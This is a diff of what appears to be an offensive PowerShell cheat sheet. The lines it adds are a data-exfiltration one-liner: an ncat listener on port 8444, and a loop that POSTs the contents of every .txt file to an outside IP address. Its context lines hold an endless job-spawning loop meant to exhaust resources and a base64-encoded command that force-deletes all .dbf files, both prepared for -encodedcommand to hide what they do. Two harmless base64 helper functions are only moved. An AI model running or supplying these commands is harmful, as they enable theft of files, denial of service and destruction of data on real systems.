@@ -5,16 +5,16 @@ while(1 -eq 1){start-job{while(1 -eq 1){$data = ls -recurse C:\windows}}}
 #above command base64 encoded, ready for powershell.exe -encodedcommand {base64}
 dwBoAGkAbABlACgAMQAgAC0AZQBxACAAMQApAHsAcwB0AGEAcgB0AC0AagBvAGIAewB3AGgAaQBsAGUAKAAxACAALQBlAHEAIAAxACkAewAkAGQAYQB0AGEAIAA9ACAAbABzACAALQByAGUAYwB1AHIAcwBlACAAQwA6AFwAdwBpAG4AZABvAHcAcwB9AH0AfQA=
 
+# exfil data one liner
+~Linux prep side - listener
+
+ncat -k -l 8444 | tee dump.txt &
+
+~ searches recursively for .txt files and for each one gets the data out of it and sends it in a HTTP POST body
+ls -Recurse -filter *.txt | foreach{$data = $null; $data = get-content $_.fullname; invoke-webrequest -method "POST" -body $data http://192.168.234.129:8444 -TimeoutSec 0.01}
+
 
 ##base64 interaction
-
-#encode string to base64 function
-
-function stringtobase64($thestring){[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$thestring"))}
-
-#decode base64 to string
-
-function base64tostring($thestring){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($thestring))}
 
 #convert a script into base64 to be passed to powershell.exe -encodedcommand {base64}
 
@@ -26,3 +26,11 @@ function base64tostring($thestring){[System.Text.Encoding]::UTF8.GetString([Syst
 ~Result:
 RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBkAGIAZgAiACAAfAAgAHIAZQBtAG8AdgBlAC0AaQB0AGUAbQAgAC0ARgBvAHIAYwBlAA==
 
+
+#encode string to base64 function
+
+function stringtobase64($thestring){[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$thestring"))}
+
+#decode base64 to string
+
+function base64tostring($thestring){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($thestring))}
